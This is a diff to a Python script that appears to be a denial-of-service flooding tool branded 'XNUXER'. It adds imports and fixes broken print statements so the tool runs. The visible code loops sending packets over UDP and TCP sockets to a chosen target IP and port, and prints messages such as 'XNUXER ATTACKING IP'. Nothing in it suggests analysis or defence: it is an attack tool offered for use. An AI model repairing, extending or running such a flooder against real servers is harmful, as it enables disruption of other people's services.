@@ -3,6 +3,9 @@ import random
 import socket
 import threading
 import os,sys
+import struct
+import codecs
+import time
 
 os.system("clear")
 print("""\033[96m\n
@@ -32,7 +35,7 @@ def run():
 			addr = (str(ip),int(port))
 			for x in range(times):
 				s.sendto(data,addr)
-			print(i +" XNUXER ATTACKING IP %s PORT %s"%(orgip,port) ")
+			print(i +" XNUXER ATTACKING IP %s PORT %s"%(orgip,port))
 		except:
 			print("[>] SERVER HAS BEEN MT")
 
@@ -46,7 +49,7 @@ def run2():
 			s.send(data)
 			for x in range(times):
 				s.send(data)
-			print(i +"  XNUXER ATTACKING IP %s PORT %s"%(orgip,port) ")
+			print(i +"  XNUXER ATTACKING IP %s PORT %s"%(orgip,port))
 		except:
 			s.close()
 			print("[>] AMFUN SAYANK")
